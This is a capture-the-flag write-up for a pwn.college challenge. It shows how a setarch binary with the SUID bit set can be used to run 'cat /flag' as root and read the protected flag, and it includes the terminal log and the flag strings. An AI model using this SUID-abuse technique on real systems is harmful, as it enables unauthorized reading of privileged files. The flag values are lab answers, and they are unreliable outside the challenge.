`setarch`

The `setarch` command in Linux allows to set the architecture for a process without changing the actual hardware or kernel architecture.

`setarch x86_64 my_program`

This command runs the `my_program` with the `x86_64` architecture. forcing it to behave as if it were running on a system with that architecture, even if the actual hardware or kernel architecture is different.

```bash
hacker@program-misuse-level-30:~$ cd /
hacker@program-misuse-level-30:/$ cd challenge/
hacker@program-misuse-level-30:/challenge$ ls
babysuid_level30
hacker@program-misuse-level-30:/challenge$ ./babysuid_level30 
Welcome to ./babysuid_level30!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/setarch.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level30) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/setarch!
hacker@program-misuse-level-30:/challenge$ setarch arm cat /flag
setarch: arm: Unrecognized architecture
hacker@program-misuse-level-30:/challenge$ lscpu
Architecture:                       x86_64
CPU op-mode(s):                     32-bit, 64-bit
Byte Order:                         Little Endian
Address sizes:                      46 bits physical, 48 bits virtual
CPU(s):                             40
On-line CPU(s) list:                0-39
Thread(s) per core:                 2
Core(s) per socket:                 10
Socket(s):                          2
NUMA node(s):                       2
Vendor ID:                          GenuineIntel
CPU family:                         6
Model:                              62
Model name:                         Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz
Stepping:                           4
CPU MHz:                            2500.048
CPU max MHz:                        3300.0000
CPU min MHz:                        1200.0000
BogoMIPS:                           5000.08
Virtualization:                     VT-x
L1d cache:                          640 KiB
L1i cache:                          640 KiB
L2 cache:                           5 MiB
L3 cache:                           50 MiB
NUMA node0 CPU(s):                  0-9,20-29
NUMA node1 CPU(s):                  10-19,30-39
Vulnerability Gather data sampling: Not affected
Vulnerability Itlb multihit:        KVM: Mitigation: Split huge pages
Vulnerability L1tf:                 Mitigation; PTE Inversion; VMX conditional cache flushes, SMT vulnerable
Vulnerability Mds:                  Mitigation; Clear CPU buffers; SMT vulnerable
Vulnerability Meltdown:             Mitigation; PTI
Vulnerability Mmio stale data:      Unknown: No mitigations
Vulnerability Retbleed:             Not affected
Vulnerability Spec store bypass:    Mitigation; Speculative Store Bypass disabled via prctl and seccomp
Vulnerability Spectre v1:           Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Vulnerability Spectre v2:           Mitigation; Retpolines, IBPB conditional, IBRS_FW, STIBP conditional, RSB filling, PBRSB-eIBRS Not affected
Vulnerability Srbds:                Not affected
Vulnerability Tsx async abort:      Not affected
Flags:                              fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constan
                                    t_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr pdcm pc
                                    id dca sse4_1 sse4_2 x2apic popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm cpuid_fault epb pti ssbd ibrs ibpb stibp tpr_shadow vnmi flexpriorit
                                    y ept vpid fsgsbase smep erms xsaveopt dtherm ida arat pln pts md_clear flush_l1d
hacker@program-misuse-level-30:/challenge$ setarch x86_64 cat /flag
pwn.college{ULWpnK0Kx6u4l_oDPDy2RDB_7ut.0lM3EDL0AjNzQzW}
hacker@program-misuse-level-30:/challenge$ setarch x86_32 cat /flag
setarch: x86_32: Unrecognized architecture
hacker@program-misuse-level-30:/challenge$ setarch i386 cat /flag
pwn.college{ULWpnK0Kx6u4l_oDPDy2RDB_7ut.0lM3EDL0AjNzQzW}
hacker@program-misuse-level-30:/challenge$ setarch cat /flag
setarch: cat: Unrecognized architecture
hacker@program-misuse-level-30:/challenge$ setarch ARM cat /flag
setarch: ARM: Unrecognized architecture
hacker@program-misuse-level-30:/challenge$ setarch --list
uname26
linux32
linux64
i386
i486
i586
i686
athlon
x86_64
hacker@program-misuse-level-30:/challenge$ setarch linux64 cat /flag 
pwn.college{ULWpnK0Kx6u4l_oDPDy2RDB_7ut.0lM3EDL0AjNzQzW}
hacker@program-misuse-level-30:/challenge$ setarch athlon cat /flag
pwn.college{ULWpnK0Kx6u4l_oDPDy2RDB_7ut.0lM3EDL0AjNzQzW}
```

The best way to quickly check the CPU architecture on Linux is by using the `lscpu` command. Here you can see that the `vscode` that you are running on your browser is using `Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz`. That means `pwn.college` is using this processor to run the `vscode`.

Also `setarch --list` lists the architectures that `setarch` knows about.